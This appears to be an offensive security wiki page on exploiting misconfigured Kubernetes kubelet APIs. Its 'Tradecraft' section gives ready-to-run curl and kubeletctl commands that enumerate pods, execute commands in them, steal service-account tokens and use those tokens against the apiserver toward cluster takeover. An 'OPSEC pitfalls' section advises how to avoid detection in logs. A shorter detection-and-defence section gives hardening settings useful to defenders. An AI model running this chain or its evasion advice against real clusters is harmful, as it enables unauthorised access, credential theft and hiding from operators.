---
title: Kubelet exposed-API attacks
slug: kubelet-exposed-api-attacks
---

> **TL;DR:** Every worker node runs a `kubelet` HTTPS listener on `:10250` whose own RBAC is separate from the apiserver's. Mis-set `--anonymous-auth=true` or `--authorization-mode=AlwaysAllow` (still the default on lots of k3s / kubespray / EKS-via-userdata clusters) and you can `exec`, `run`, `attach`, and read logs on every pod — no kubeconfig needed. Read-only port `:10255` was removed by default in 1.10 but lingers in older managed clusters.

## What it is
The kubelet exposes a small HTTP API to support `kubectl exec`, port-forward, log streaming, and metrics. Two distinct configuration knobs gate it: `--anonymous-auth` (whether unauthenticated requests are accepted) and `--authorization-mode` (`AlwaysAllow` or `Webhook` — the latter delegates to the apiserver SubjectAccessReview). Production-grade clusters set `anonymous-auth=false` and `authorization-mode=Webhook`. The wild has clusters where one or both are wrong — often because a custom bootstrap script overrode the kubeadm defaults, or because a node was provisioned by an older Terraform module.

## Preconditions / where it applies
- Network reachability to a worker node on `:10250` (or legacy `:10255`).
- For impact: kubelet configured with `--anonymous-auth=true` and/or `--authorization-mode=AlwaysAllow`.

## Tradecraft
**Step 1 — Discover and fingerprint.**

```bash
# From an internal pivot or compromised pod
for n in $(kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type=="InternalIP")].address}'); do
  curl -sk https://$n:10250/pods | head -c 200 && echo " <-- $n"
done
# 200 OK with JSON of pods = anonymous + AlwaysAllow
# 401 Unauthorized = anon disabled
# 403 Forbidden = anon enabled but Webhook authz (need a valid token)
```

`kubeletctl` automates the same probe across a range:

```bash
kubeletctl scan --cidr 10.0.0.0/16 --port 10250
kubeletctl pods -s NODE_IP
```

**Step 2 — List pods and pick a target.**

```bash
curl -sk https://NODE:10250/pods | jq '.items[] | {ns:.metadata.namespace, name:.metadata.name, containers:[.spec.containers[].name]}'
```

Prefer pods with mounted service account tokens (`spec.automountServiceAccountToken != false`) and high-privilege bindings (`kube-system/*`, `*operator*`).

**Step 3 — `run` (exec) inside the chosen pod.**

```bash
curl -sk -X POST \
  "https://NODE:10250/run/NAMESPACE/PODNAME/CONTAINER" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

The legacy `/run` endpoint returns command output directly. With the token in hand, talk to the apiserver as the pod's SA:

```bash
TOKEN=$(curl -sk -X POST https://NODE:10250/run/kube-system/coredns-xxx/coredns -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")
kubectl --server=https://APISERVER --token="$TOKEN" --insecure-skip-tls-verify auth can-i --list
```

**Step 4 — `exec` for interactive (SPDY/websocket).** `/exec/<ns>/<pod>/<container>` requires SPDY upgrade headers; `kubeletctl exec -p POD -n NS -c CONTAINER -i NODE -- /bin/sh` handles the protocol.

**Step 5 — Container escape via mounted host paths.** Many SA tokens are limited, but the pod itself might have `hostPath` or `hostNetwork`. Once inside via `run`/`exec`:

```bash
# Inside the kubelet-exec'd container
mount | grep -E '/(etc|root|var/lib)'      # hostPath inventory
ls -la /var/run/docker.sock                # container escape via docker socket
```

**Step 6 — Read-only port (`:10255`) legacy.** If exposed, `GET /pods`, `/spec/`, `/healthz` all return without auth — pre-RBAC reconnaissance.

```bash
curl -s http://NODE:10255/pods
```

**Step 7 — Pivot pattern: kubelet → SA → apiserver.** The SA-token grab in Step 3 is the canonical lateral chain. Once you have a `kube-system` SA token bound to `cluster-admin` (common with operator pods), you've owned the cluster.

## Detection and defence
- `kubelet-config.yaml`: `authentication.anonymous.enabled: false`; `authorization.mode: Webhook`; `readOnlyPort: 0`. Verify on every node:

```bash
kubectl get --raw /api/v1/nodes/NODE/proxy/configz | jq '.kubeletconfig | {anonymous: .authentication.anonymous.enabled, authz: .authorization.mode, ro: .readOnlyPort}'
```

- NetworkPolicy / security group: restrict `:10250` to control-plane IPs only. The kubelet doesn't need pod-to-pod reachability on this port.
- Falco rule `K8s Operations Anonymous Request` flags `system:anonymous` SubjectAccessReviews.
- Detect lateral via SA tokens: apiserver audit `userAgent=~"kubeletctl|curl"` and `user.username` matching `system:serviceaccount:*`.
- Rotate SA tokens (`kubectl create token`); avoid mounting tokens (`automountServiceAccountToken: false`) on pods that don't need apiserver access.

## OPSEC pitfalls
- Every successful `/run` and `/exec` is logged to the kubelet's stderr (journald `_SYSTEMD_UNIT=kubelet.service`). Centralised log shippers forward those.
- SA token use logs to apiserver audit; switching from anonymous kubelet probe to authenticated apiserver action is the loud step. Use the SA token sparingly and pull as much as possible via the kubelet directly.
- `kubeletctl` user-agent identifies you; a curl from a normal-looking source-IP is quieter.

## References
- [Kubernetes — Kubelet authentication/authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/) — official model
- [kubeletctl](https://github.com/cyberark/kubeletctl) — exploitation tooling
- [CyberArk — Kubelet attacks](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3) — full chain
- [Aqua Security — Kubernetes attack matrix](https://www.aquasec.com/cloud-native-academy/cloud-attacks/) — kubelet exposure entries

See also: [[k8s-rbac-abuse]], [[k8s-service-account-tokens]], [[k8s-privileged-pod]], [[k8s-host-mount-escape]], [[eks-pod-identity-abuse]]
